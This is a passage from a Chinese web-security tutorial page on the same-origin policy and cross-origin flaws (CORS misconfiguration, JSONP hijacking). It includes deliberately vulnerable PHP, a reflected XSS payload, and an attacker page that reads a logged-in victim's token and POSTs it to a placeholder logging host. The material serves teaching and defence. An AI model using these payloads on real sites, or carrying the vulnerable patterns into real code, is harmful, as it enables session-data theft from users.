@@ -1,0 +1,252 @@
+<!DOCTYPE html>
+<html lang="zh-cn">
+  <head><meta charset="UTF-8"/>
+<meta http-equiv="X-UA-Compatible" content="IE=edge" />
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1"/>
+
+
+<meta http-equiv="Cache-Control" content="no-transform" />
+<meta http-equiv="Cache-Control" content="no-siteapp" />
+
+<meta name="theme-color" content="#f8f5ec" />
+<meta name="msapplication-navbutton-color" content="#f8f5ec">
+<meta name="apple-mobile-web-app-capable" content="yes">
+<meta name="apple-mobile-web-app-status-bar-style" content="#f8f5ec">
+
+<meta name="description" content="同源策略与跨域漏洞"/><meta name="keywords" content="research,analyze" /><link rel="alternate" href="/atom.xml" title="Blog" type="application/atom+xml"><link rel="shortcut icon" type="image/x-icon" href="/favicon.ico?v=2.11.0" />
+<link rel="canonical" href="https://hosch3n.github.io/2020/08/26/同源策略与跨域漏洞/"/>
+
+<link rel="stylesheet" type="text/css" href="/lib/fancybox/jquery.fancybox.css" />
+<link rel="stylesheet" type="text/css" href="/css/style.css?v=2.11.0" />
+
+<!-- Global site tag (gtag.js) - Google Analytics -->
+<script async src="https://www.googletagmanager.com/gtag/js?id=UA-180953397-1"></script>
+<script>
+  window.dataLayer = window.dataLayer || [];
+  function gtag(){dataLayer.push(arguments);}
+  gtag('js', new Date());
+
+  gtag('config', 'UA-180953397-1');
+</script><script id="baidu_push">
+(function(){
+    var bp = document.createElement('script');
+    var curProtocol = window.location.protocol.split(':')[0];
+    if (curProtocol === 'https') {
+        bp.src = 'https://zz.bdstatic.com/linksubmit/push.js';
+    }
+    else {
+        bp.src = 'http://push.zhanzhang.baidu.com/push.js';
+    }
+    var s = document.getElementsByTagName("script")[0];
+    s.parentNode.insertBefore(bp, s);
+})();
+</script>
+<script>
+  window.config = {"leancloud":{"app_id":null,"app_key":null},"toc":true,"fancybox":true,"pjax":"","latex":false};
+</script>
+
+    <title>同源策略与跨域漏洞 - Blog</title>
+  <meta name="generator" content="Hexo 5.4.0"></head>
+
+  <body><div id="mobile-navbar" class="mobile-navbar">
+  <div class="mobile-header-logo">
+    <a href="/." class="logo">Blog</a>
+  </div>
+  <div class="mobile-navbar-icon">
+    <span></span>
+    <span></span>
+    <span></span>
+  </div>
+</div>
+
+<nav id="mobile-menu" class="mobile-menu slideout-menu">
+  <ul class="mobile-menu-list"><a href="/">
+        <li class="mobile-menu-item">首页
+          </li>
+      </a><a href="/tags/">
+        <li class="mobile-menu-item">标签
+          </li>
+      </a><a href="/categories/">
+        <li class="mobile-menu-item">分类
+          </li>
+      </a><a href="/about/">
+        <li class="mobile-menu-item">关于
+          </li>
+      </a></ul>
+</nav>
+<div class="container" id="mobile-panel">
+      <header id="header" class="header"><div class="logo-wrapper">
+  <a href="/." class="logo">Blog</a>
+</div>
+
+<nav class="site-navbar"><ul id="menu" class="menu"><li class="menu-item">
+          <a class="menu-item-link" href="/">
+            首页
+            </a>
+        </li>
+      <li class="menu-item">
+          <a class="menu-item-link" href="/tags/">
+            标签
+            </a>
+        </li>
+      <li class="menu-item">
+          <a class="menu-item-link" href="/categories/">
+            分类
+            </a>
+        </li>
+      <li class="menu-item">
+          <a class="menu-item-link" href="/about/">
+            关于
+            </a>
+        </li>
+      </ul></nav>
+</header>
+
+      <main id="main" class="main">
+        <div class="content-wrapper">
+          <div id="content" class="content"><article class="post">
+    <header class="post-header">
+      <h1 class="post-title">同源策略与跨域漏洞
+        </h1>
+
+      <div class="post-meta">
+        <span class="post-time">
+          2020-08-26
+        </span><span class="post-category">
+            <a href="/categories/Web%E5%AE%89%E5%85%A8/">Web安全</a>
+            </span>
+        </div>
+    </header>
+
+    <div class="post-toc" id="post-toc">
+    <h2 class="post-toc-title">文章目录</h2>
+    <div class="post-toc-content">
+      <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%BD%95%E4%B8%BA%E5%90%8C%E6%BA%90"><span class="toc-text">何为同源</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%A6%82%E4%BD%95%E8%B7%A8%E5%9F%9F"><span class="toc-text">如何跨域</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#CORS"><span class="toc-text">CORS</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#src%E5%B1%9E%E6%80%A7"><span class="toc-text">src属性</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#JSONP"><span class="toc-text">JSONP</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%AD%90%E4%BB%97%E7%88%B6%E5%8A%BF"><span class="toc-text">子仗父势</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E8%BE%B9%E7%BC%98%E8%AF%95%E6%8E%A2"><span class="toc-text">边缘试探</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%94%BB%E5%87%BB%E6%80%9D%E8%B7%AF%E4%B8%80"><span class="toc-text">攻击思路一</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%94%BB%E5%87%BB%E6%80%9D%E8%B7%AF%E4%BA%8C"><span class="toc-text">攻击思路二</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%94%BB%E5%87%BB%E6%80%9D%E8%B7%AF%E4%B8%89%EF%BC%88%E8%AF%AF%EF%BC%89"><span class="toc-text">攻击思路三（误）</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%8F%82%E8%80%83%E9%93%BE%E6%8E%A5"><span class="toc-text">参考链接</span></a></li></ol>
+    </div>
+  </div><div class="post-content"><h2 id="何为同源"><a href="#何为同源" class="headerlink" title="何为同源"></a>何为同源</h2><p>如果两个URL的协议、域名、端口一致则满足同源，<code>http</code>与<code>https</code>、<code>a.x.com</code>与<code>b.x.com</code>、<code>:80</code>与<code>:81</code>均不符合同源条件。通过<code>windows.open()</code>等方式打开的<code>about:blank</code>空白页将继承上级的源</p>
+<ul>
+<li>IE浏览器中，两个相互信任的白名单域名之间、以及不同端口均不受同源策略限制</li>
+</ul>
+<h2 id="如何跨域"><a href="#如何跨域" class="headerlink" title="如何跨域"></a>如何跨域</h2><h3 id="CORS"><a href="#CORS" class="headerlink" title="CORS"></a>CORS</h3><p>在处理前后端分离、跨站请求等业务时可能会涉及跨域访问，浏览器出于安全考虑将拦截跨域请求的响应结果（但不会阻止发出跨域请求），除非存在相应的CORS响应头</p>
+<p>满足CORS条件后，浏览器继续将跨域请求细分为 简单型请求 与 预检型请求。只有满足特定HTTP头的<code>GET</code>、<code>POST</code>、<code>HEAD</code>请求为简单请求，否则为预检请求，具体条件见参考链接2</p>
+<p>简单型请求会直接发起请求并响应结果，但预检型请求发起前浏览器会先发起<code>OPTIONS</code>请求用作校验。预检型请求的响应将包含<code>Access-Control-Max-Age</code>响应头用于说明有效时间（秒），在有效时间内不必再次发起预检请求</p>
+<p>若<code>XMLHttpRequest</code>对象的<code>withCredentials</code>属性被设置为<code>true</code>，或是向<code>fetch()</code>方法的<code>init</code>对象传递了<code>credentials: &#39;include&#39;</code>，则其在发送请求时会附带Cookies。但如果响应头缺少<code>Access-Control-Allow-Credentials: true</code>，则浏览器不会展现响应内容</p>
+<ul>
+<li>带Cookies的请求，服务器的<code>Access-Control-Allow-Origin</code>不能为<code>*</code>，即浏览器不会展现如下响应头组合的页面：</li>
+</ul>
+<figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">Access-Control-Allow-Origin</span>: *</span><br><span class="line"><span class="attribute">Access-Control-Allow-Credentials</span>: true</span><br></pre></td></tr></table></figure>
+
+<h3 id="src属性"><a href="#src属性" class="headerlink" title="src属性"></a>src属性</h3><p>有<code>src</code>属性的标签都是可以发起跨域请求的，但仅限于对其原本内容的引用，而不可以对跨域加载的资源进行读写</p>
+<h3 id="JSONP"><a href="#JSONP" class="headerlink" title="JSONP"></a>JSONP</h3><p>JSONPadding是一个精妙的民间花式跨域方法，通过回调函数配合JSON数据填充来实现</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><span class="line">&lt;!-- a.x.com --&gt;</span><br><span class="line"><span class="comment">// 原生JS形式</span></span><br><span class="line">&lt;script&gt;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">fun</span>(<span class="params">data</span>) </span>&#123;</span><br><span class="line">        <span class="comment">// ...</span></span><br><span class="line">    &#125;</span><br><span class="line">&lt;/script&gt;</span><br><span class="line">&lt;script src=<span class="string">&#x27;//b.x.com/?callback=fun&#x27;</span>&gt;&lt;/script&gt;</span><br><span class="line"></span><br><span class="line"><span class="comment">// jQuery $.getJSON形式</span></span><br><span class="line">&lt;script&gt;</span><br><span class="line">    $.getJSON(<span class="string">&#x27;//b.x.com/?callback=?&#x27;</span>, <span class="function"><span class="keyword">function</span>(<span class="params">data</span>) </span>&#123;</span><br><span class="line">        <span class="comment">// ...</span></span><br><span class="line">    &#125;);</span><br><span class="line">&lt;/script&gt; </span><br><span class="line"></span><br><span class="line"><span class="comment">// jQuery $.ajax形式</span></span><br><span class="line">&lt;script&gt;</span><br><span class="line">    $(<span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        $.ajax(&#123;</span><br><span class="line">            type: <span class="string">&quot;get&quot;</span>, <span class="comment">// 请求方法JSONP默认GET，POST也会转GET</span></span><br><span class="line">            async: <span class="literal">false</span>, <span class="comment">// 异步请求JSONP默认false，true也会转false</span></span><br><span class="line">            url: <span class="string">&quot;//b.x.com/&quot;</span>,</span><br><span class="line">            <span class="comment">// data: &#123;&quot;code&quot; : &quot;CA1405&quot;&#125;, // 传入参数</span></span><br><span class="line">            dataType: <span class="string">&quot;jsonp&quot;</span>,</span><br><span class="line">            jsonp: <span class="string">&quot;callback&quot;</span>,</span><br><span class="line">            <span class="comment">// jsonpCallback:&quot;flightHandler&quot;, // 回调函数名jQuery默认随机，也可以写&quot;?&quot;</span></span><br><span class="line">            success: <span class="function"><span class="keyword">function</span>(<span class="params">data</span>) </span>&#123;</span><br><span class="line">                <span class="comment">// ...</span></span><br><span class="line">            &#125;,</span><br><span class="line">            <span class="built_in">error</span>: <span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">                <span class="comment">// ...</span></span><br><span class="line">            &#125;,</span><br><span class="line">        &#125;);</span><br><span class="line">    &#125;)</span><br><span class="line">&lt;/script&gt;</span><br><span class="line"></span><br><span class="line"><span class="comment">// jQuery $.get形式</span></span><br><span class="line">&lt;script&gt;</span><br><span class="line">$.get(<span class="string">&#x27;//b.x.com/?callback=?&#x27;</span>, <span class="function"><span class="keyword">function</span> (<span class="params">data</span>) </span>&#123;<span class="comment">/* ... */</span>&#125;, <span class="string">&#x27;jsonp&#x27;</span>);  </span><br><span class="line">&lt;/script&gt;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&lt;!-- b.x.com --&gt;</span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">header(<span class="string">&#x27;Content-type: application/json&#x27;</span>);</span><br><span class="line">$callback = $_GET[<span class="string">&#x27;callback&#x27;</span>];</span><br><span class="line">$data = <span class="keyword">array</span>(<span class="string">&#x27;a&#x27;</span>,<span class="string">&#x27;b&#x27;</span>,<span class="string">&#x27;c&#x27;</span>);</span><br><span class="line"><span class="keyword">echo</span> $callback.<span class="string">&#x27;(&#x27;</span>.json_encode($data).<span class="string">&#x27;)&#x27;</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<h3 id="子仗父势"><a href="#子仗父势" class="headerlink" title="子仗父势"></a>子仗父势</h3><p>如果显式地将<code>a.x.com</code>、<code>b.x.com</code>与<code>x.com</code>的<code>document.domain</code>属性同时设置为<code>x.com</code>，则可以同时满足同源条件</p>
+<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* </span></span><br><span class="line"><span class="comment">    - 此赋值会重写端口为NULL </span></span><br><span class="line"><span class="comment">    - 不影响 XMLHttpRequest 与 fetch</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// x.com</span></span><br><span class="line"><span class="built_in">document</span>.domain = <span class="string">&#x27;x.com&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// a.x.com</span></span><br><span class="line"><span class="built_in">document</span>.domain = <span class="string">&#x27;x.com&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// b.x.com</span></span><br><span class="line"><span class="built_in">document</span>.domain = <span class="string">&#x27;x.com&#x27;</span>;</span><br></pre></td></tr></table></figure>
+
+<h3 id="边缘试探"><a href="#边缘试探" class="headerlink" title="边缘试探"></a>边缘试探</h3><p><code>window.name</code>属性伴随一个window的整个声明周期，在此期间iframe内载入的所有页面共享同一个<code>window.name</code>值</p>
+<p><code>postMesage</code>配合监听事件、<code>location.hash</code>配合中间页均有一定跨域效果</p>
+<h2 id="攻击思路一"><a href="#攻击思路一" class="headerlink" title="攻击思路一"></a>攻击思路一</h2><p>若为了方便直接将Origin请求头拼接进CORS响应头，会导致CORS跨域漏洞。假设<code>a.x.com/index.php</code>负责校验身份并设置Cookie，<code>a.x.com/cors.php</code>负责返回敏感数据，当受害者登录目标站点后，在Cookie失效前又访问了恶意站点<code>hack.com</code>，即可被攻击者窃取敏感数据</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br></pre></td><td class="code"><pre><span class="line">&lt;!-- a.x.com/index.php --&gt;</span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line">session_start();</span><br><span class="line">$user = <span class="keyword">isset</span>($_POST[<span class="string">&#x27;user&#x27;</span>]) ? $_POST[<span class="string">&#x27;user&#x27;</span>] : <span class="string">&#x27;&#x27;</span>;</span><br><span class="line">$passwd = <span class="keyword">isset</span>($_POST[<span class="string">&#x27;passwd&#x27;</span>]) ? $_POST[<span class="string">&#x27;passwd&#x27;</span>] : <span class="string">&#x27;&#x27;</span>;</span><br><span class="line"><span class="keyword">if</span> ($user===<span class="string">&#x27;admin&#x27;</span> &amp;&amp; $passwd===<span class="string">&#x27;passwd&#x27;</span>) &#123;</span><br><span class="line">    $_SESSION[<span class="string">&#x27;user&#x27;</span>] = $user;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>($_GET[<span class="string">&#x27;logout&#x27;</span>])) &#123;</span><br><span class="line">    <span class="keyword">if</span> ($_GET[<span class="string">&#x27;logout&#x27;</span>]===<span class="string">&#x27;1&#x27;</span>) &#123;</span><br><span class="line">        <span class="keyword">unset</span>($_SESSION[<span class="string">&#x27;user&#x27;</span>]);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;&lt;a href=&quot;//a.x.com/json.php?callback=jsonp&quot;&gt;用户信息A&lt;/a&gt;&lt;br /&gt;&#x27;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;&lt;a href=&quot;//a.x.com/cors.php&quot;&gt;用户信息B&lt;/a&gt;&lt;br /&gt;&#x27;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;&lt;a href=&quot;//a.x.com/index.php?logout=1&quot;&gt;退出登录&lt;/a&gt;&lt;br /&gt;&#x27;</span>;</span><br><span class="line"><span class="keyword">if</span> (!$_SESSION[<span class="string">&#x27;user&#x27;</span>]) &#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&#x27;&lt;!DOCTYPE html&gt;</span></span><br><span class="line"><span class="string">&lt;html&gt;</span></span><br><span class="line"><span class="string">    &lt;head&gt;</span></span><br><span class="line"><span class="string">        &lt;meta http-equiv=&quot;Content-Type&quot; content=&quot;text/html; charset=utf-8&quot; /&gt;</span></span><br><span class="line"><span class="string">        &lt;title&gt;悲催的A&lt;/title&gt;</span></span><br><span class="line"><span class="string">    &lt;/head&gt;</span></span><br><span class="line"><span class="string">&lt;body&gt;</span></span><br><span class="line"><span class="string">    &lt;div style=&quot;margin-left: 100px&quot;&gt;</span></span><br><span class="line"><span class="string">        &lt;form id=&quot;login&quot; action=&quot;index.php&quot; method=&quot;POST&quot;&gt;</span></span><br><span class="line"><span class="string">        账户：&lt;input id=&quot;user&quot; type=&quot;text&quot; name=&quot;user&quot;&gt;&lt;br /&gt;</span></span><br><span class="line"><span class="string">        密码：&lt;input id=&quot;passwd&quot; type=&quot;password&quot; name=&quot;passwd&quot;&gt;&lt;br /&gt;</span></span><br><span class="line"><span class="string">        &lt;input id=&quot;submit&quot; type=&quot;submit&quot; value=&quot;提交&quot;&gt;</span></span><br><span class="line"><span class="string">    &lt;/div&gt;</span></span><br><span class="line"><span class="string">&lt;/body&gt;</span></span><br><span class="line"><span class="string">&lt;/html&gt;&#x27;</span>;</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="keyword">echo</span> $_SESSION[<span class="string">&#x27;user&#x27;</span>].<span class="string">&#x27;登录成功&lt;br /&gt;&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br><span class="line">&lt;!-- a.x.com/cors.php --&gt;</span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>($_SERVER[<span class="string">&#x27;HTTP_ORIGIN&#x27;</span>])) &#123;</span><br><span class="line">    header(<span class="string">&#x27;Access-Control-Allow-Origin:&#x27;</span>.$_SERVER[<span class="string">&#x27;HTTP_ORIGIN&#x27;</span>]);</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    header(<span class="string">&#x27;Access-Control-Allow-Origin: *&#x27;</span>);</span><br><span class="line">&#125;</span><br><span class="line">header(<span class="string">&quot;Access-Control-Allow-Credentials: true&quot;</span>);</span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line">session_start();</span><br><span class="line"><span class="keyword">if</span> ($_SESSION[<span class="string">&#x27;user&#x27;</span>]===<span class="string">&#x27;admin&#x27;</span>) &#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&#x27;&#123;&quot;id&quot;: 0, &quot;token&quot;: &quot;SuperSecTokenStr&quot;)&#125;&#x27;</span>;</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&#x27;请求失败&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br><span class="line">&lt;!-- hack.com --&gt;</span><br><span class="line">&lt;!DOCTYPE html&gt;</span><br><span class="line">&lt;html&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">    &lt;meta http-equiv=<span class="string">&quot;Content-Type&quot;</span> content=<span class="string">&quot;text/html; charset=utf-8&quot;</span> /&gt;</span><br><span class="line">    &lt;meta name=<span class="string">&quot;referrer&quot;</span> content=<span class="string">&quot;never&quot;</span>&gt;</span><br><span class="line">    &lt;title&gt;hack站或有XSS的页面&lt;/title&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">    &lt;script&gt;</span><br><span class="line">        fetch(<span class="string">&#x27;//a.x.com/cors.php&#x27;</span>, &#123;</span><br><span class="line">            credentials: <span class="string">&#x27;include&#x27;</span></span><br><span class="line">        &#125;).then(<span class="function"><span class="keyword">function</span> (<span class="params">response</span>) </span>&#123;</span><br><span class="line">            <span class="keyword">return</span> response.text();</span><br><span class="line">        &#125;).then(<span class="function"><span class="keyword">function</span> (<span class="params">datas</span>) </span>&#123;</span><br><span class="line">            fetch(<span class="string">&#x27;//WebLog/&#x27;</span> ,&#123;</span><br><span class="line">                method: <span class="string">&#x27;POST&#x27;</span>,</span><br><span class="line">                mode: <span class="string">&#x27;no-cors&#x27;</span>,</span><br><span class="line">                body: JSON.stringify(datas)</span><br><span class="line">            &#125;);</span><br><span class="line">        &#125;);</span><br><span class="line">    &lt;/script&gt;</span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li><p>Chromium从Ver.80开始Cookies的SameSite默认为Lax，即会默认拦截跨域Cookie（感谢phithon师傅的强势指导），Firefox 68.6可以复现</p>
+</li>
+<li><p>可通过<code>Set-Cookie: SameSite=None; Secure</code>响应头显式地允许通过HTTPS传输跨域Cookie</p>
+</li>
+</ul>
+<h2 id="攻击思路二"><a href="#攻击思路二" class="headerlink" title="攻击思路二"></a>攻击思路二</h2><p>当JSONP的动态处理页未设置<code>Content-Type</code>响应头时其默认为<code>text/html</code>，可能会导致反射XSS：<code>?callback=xss&lt;script&gt;alert(1)&lt;/script&gt;</code></p>
+<p>将JSONP的动态处理页<code>Content-Type</code>响应头设置为<code>application/json</code>便可以防御反射XSS，但仍可能存在JSONP数据劫持</p>
+<p>在讲JSONP数据劫持之前，先了解一下曾出现过的JSON数据劫持。假设<code>json.x.com</code>在校验登录成功后，会向客户端返回<code>account</code>之类的数据</p>
+<figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">    <span class="attr">&quot;account&quot;</span>: <span class="string">&quot;admin@x.com&quot;</span>,</span><br><span class="line">    <span class="attr">&quot;...&quot;</span>: <span class="string">&quot;...&quot;</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>当受害者登录目标站点后，在Cookie失效前又访问了恶意站点<code>hack.com</code>，即可被攻击者窃取其之前的JSON数据</p>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="javascript"><span class="built_in">Object</span>.defineProperty(<span class="built_in">Object</span>.prototype,<span class="string">&quot;account&quot;</span>,&#123;</span></span><br><span class="line"><span class="javascript">    set:<span class="function"><span class="keyword">function</span>(<span class="params">obj</span>) </span>&#123;</span></span><br><span class="line"><span class="javascript">        <span class="comment">// ...</span></span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;);</span><br><span class="line"><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">&quot;json.x.com&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>这段代码通过重写Object类的set方法实现了对<code>account</code>属性的hook，目前该漏洞已被修复，可以通过本地测试来管中窥豹</p>
+<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">Object</span>.defineProperty(<span class="built_in">Object</span>.prototype, <span class="string">&quot;Id&quot;</span>, &#123;</span><br><span class="line">    set:<span class="function"><span class="keyword">function</span>(<span class="params">obj</span>) </span>&#123;</span><br><span class="line">        alert(obj);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 这样怼属性可以</span></span><br><span class="line"><span class="keyword">var</span> a = <span class="keyword">new</span> <span class="built_in">Object</span>();</span><br><span class="line">a.Id = <span class="number">666</span>;</span><br><span class="line"><span class="comment">// 这个JSON就不行了</span></span><br><span class="line"><span class="keyword">var</span> b=&#123;<span class="string">&quot;Id&quot;</span>:<span class="number">250</span>&#125;;</span><br></pre></td></tr></table></figure>
+
+<p>看完了被修复的JSON劫持，再来看看目前依然存在的JSONP劫持。假设<code>a.x.com/index.php</code>负责校验身份并调用数据接口，<code>a.x.com/json.php</code>负责返回敏感数据，当受害者登录目标站点后，在Cookie失效前又访问了恶意站点<code>hack.com</code>，即可被攻击者窃取敏感数据</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line">&lt;!-- a.x.com/index.php --&gt;</span><br><span class="line"><span class="comment">// 与上例相同</span></span><br><span class="line"></span><br><span class="line">&lt;!-- a.x.com/json.php --&gt;</span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">header(<span class="string">&#x27;Content-type: application/json&#x27;</span>);</span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line">session_start();</span><br><span class="line">$callback = $_GET[<span class="string">&#x27;callback&#x27;</span>];</span><br><span class="line"><span class="keyword">if</span> ($_SESSION[<span class="string">&#x27;user&#x27;</span>]===<span class="string">&#x27;admin&#x27;</span>)&#123;</span><br><span class="line">    <span class="keyword">echo</span> $callback.<span class="string">&#x27;(&#123;&quot;id&quot;: 0, &quot;token&quot;: &quot;SuperSecTokenStr&quot;&#125;)&#x27;</span>;</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="keyword">echo</span> $callback.<span class="string">&#x27;获取失败&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br><span class="line">&lt;!-- hack.com --&gt;</span><br><span class="line">&lt;!DOCTYPE 